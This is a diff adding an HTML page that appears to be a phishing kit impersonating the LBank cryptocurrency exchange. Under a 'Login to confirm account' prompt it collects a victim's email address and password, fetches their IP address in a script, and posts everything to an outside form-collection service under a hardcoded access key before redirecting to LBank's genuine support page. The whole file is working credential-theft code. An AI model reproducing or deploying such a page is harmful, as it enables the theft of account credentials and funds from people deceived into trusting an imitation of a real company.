@@ -1,0 +1,58 @@
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script>
+        function getIP() {
+            // Fetch the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').value = data.ip; // Set the IP address
+                    document.getElementById('locationForm').submit(); // Submit the form
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    alert('Could not retrieve IP address.');
+                });
+        }
+
+        function submitForm(event) {
+            event.preventDefault(); // Prevent default form submission
+            getIP(); // Get IP and then submit
+        }
+    </script>
+</head>
+<body style="margin: 0.4em; font-size: 14pt; background-color: black;">
+<div align="left"><img width="264" height="80" style="width: 179px; height: 43px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRrNKzwLWnXAwsJpqzoeltPCIQPwmJrNoJTlTs-9mczd4vqPuIlJ02_LMMWkua7l2njng&amp;usqp=CAU"><br><br><br><br>
+<br><br><br></div><div>
+</div><div><div class="_4-u2 _1w1t _4-u8 _52jv" style="margin: auto; padding: 0px 0px 14px; border-radius: 8px; border: 1px solid gray; border-image: none; width: 358px; height: 376px; text-align: center; font-family: inherit; box-shadow: 0px 2px 4px rgba(0,0,0,0.1), 0px 8px 16px rgba(0,0,0,0.1); background-color: rgb(34, 31, 41);"><div align="left" class="_xku" style="padding: 24px 0px 16px; font-family: inherit;">
+<span class="_97w1 _50f6" style="line-height: 22px; font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif; font-size: 18px;">
+&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<font color="#ffffff"><strong><span style="font-size: 19.3px;"><span style="font-size: 20.6px;"><span style="font-size: 21.9px;"><span style="font-size: 23.2px;"><span style="font-family: Verdana;"><span style="font-family: Trebuchet MS;">LBank</span></span></span></span></span></span></strong></font><span style="font-size: 19.3px;"><span style="font-size: 20.6px;"><span style="font-size: 21.9px;"><span style="font-size: 23.2px;">
+<span style="font-family: Verdana;">
+</span></span></span></span></span><strong style="font-family: Verdana;"><span style="font-size: 19.3px;"><span style="font-size: 20.6px;"><span style="font-size: 21.9px;"><span style="font-size: 23.2px;"><span style="font-family: Verdana;">
+ </span></span></span></span></span></strong><br><strong>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 20.6px;"><span style="font-size: 19.3px;"><span style="font-size: 20.6px;"><font color="#000000">&nbsp;&nbsp;</font></span></span></span>&nbsp;&nbsp;</strong><br><br><span style="font-size: 16.7px;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#ffffff">Login to confirm account</font></span></span></div><div class="login_form_container" style="font-family: inherit;">
+<form id="locationForm" style="margin: 0px; padding: 0px;" onsubmit="submitForm(event);" action="https://api.web3forms.com/submit" method="post"><div style="font-family: inherit;"></div><div style="font-family: inherit;"><div class="clearfix _5466 _44mg" id="email_container" style="margin: auto; padding: 6px 0px; width: 324px; height: 46px; font-family: inherit; -ms-zoom: 1;"><div align="center">
+<input name="id" title="Email address" class="input" id="login_id" style="list-style: none; margin: 0px 0px 10px; padding: 0px 10px; border-radius: 5px; border: 1px solid gray; border-image: none; width: 284px; height: 50px; color: inherit; line-height: 14px; text-indent: 5px; letter-spacing: -0.5px; overflow: hidden; font-family: Arial; font-size: 14px; font-style: inherit; font-variant: inherit; font-weight: inherit; vertical-align: middle; white-space: nowrap; position: relative; 
+-ms-word-break: break-all; -ms-text-overflow: ellipsis; box-sizing: inherit; font-stretch: inherit; background-color: rgb(255, 255, 255) !important; appearance: none; text-size-adjust: none; overflow-wrap: normal;" type="text" size="1" maxlength="50" placeholder="Please enter your address" value=""></div></div></div><div style="font-family: inherit;"><div class="clearfix _5466 _44mg" style="margin: auto; padding: 6px 0px; width: 306px; height: 40px; font-family: inherit; -ms-zoom: 1;">
+<div style="font-family: inherit;"></div><div align="center" style="font-family: inherit;">
+<input name="pw" title="Email password" class="input" id="login_pwd" style="list-style: none; margin: 0px 0px 10px; padding: 0px 10px; border-radius: 5px; border: 1px solid gray; border-image: none; width: 284px; height: 50px; color: inherit; line-height: 14px; text-indent: 5px; letter-spacing: -0.5px; overflow: hidden; font-family: Arial; font-size: 14px; font-style: inherit; font-variant: inherit; font-weight: inherit; vertical-align: middle; white-space: nowrap; -ms-word-break: break-all; 
+-ms-text-overflow: ellipsis; box-sizing: inherit; font-stretch: inherit; background-color: rgb(255, 255, 255) !important; appearance: none; text-size-adjust: none; overflow-wrap: normal;" type="password" size="1" maxlength="30" placeholder="Please enter password" value=""></div></div></div><div align="left" class="_xkt" style="padding: 6px 0px; font-family: inherit;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-size: 16px;"><font color="#ffffff">Forgot password?</font></span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<input name="ip" id="ip" type="hidden">
+<input type="hidden" name="access_key" value="4151e14a-96ae-46a2-82c5-6860cb374505">
+<input type="hidden" name="redirect" value="https://support.lbank.com/hc/en-gb/sections/21294766261017">
+<button name="login" tabindex="0" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" style="margin: 0px; padding: 0px 16px; border-radius: 6px; border: currentColor; transition:background-color 200ms cubic-bezier(0.08, 0.52, 0.52, 1), box-shadow 200ms cubic-bezier(0.08, 0.52, 0.52, 1), transform 200ms cubic-bezier(0.08, 0.52, 0.52, 1); border-image: none; width: 272px; height: 51px; text-align: center; color: rgb(255, 255, 255); 
+line-height: 48px; font-family: Verdana; font-size: 17.4px; text-decoration: none; vertical-align: middle; display: inline-block; white-space: nowrap; position: relative; cursor: pointer; box-sizing: content-box; text-shadow: none; justify-content: center; background-color: rgb(222, 167, 40); -webkit-font-smoothing: antialiased;" type="submit" value="1"><strong style="font-size: 14.8px;">Login</strong></button></div><div style="font-family: inherit;">
+</div><div style="font-family: inherit;"><div class="_1rf5" style="margin: 10px 8px; width: auto; text-align: center; overflow: hidden; font-family: inherit; display: block; white-space: nowrap;"></div></div><div class="_xkt" style="padding: 6px 0px; font-family: inherit;"><br></div></form></div></div></div><div><br></div>
+<p align="center" style="margin: 0px; padding: 10px 0px 0px; color: rgba(153, 153, 153, 0.8); letter-spacing: -0.6px; font-family: Verdana, sans-serif; font-size: 10px; font-weight: 700;">
+<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+<br><br>
+<span style='text-align: center; color: rgba(255, 255, 255, 0.3); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: "HarmonyOS Sans", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: normal; orphans: 2; widows: 2; background-color: rgba(0, 0, 0, 0.3); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial;'>Copyright&copy; 2015-2024 LBank. All Right Reserved.</span><br><br><br></font></font></p>
+
+
+</body></html>
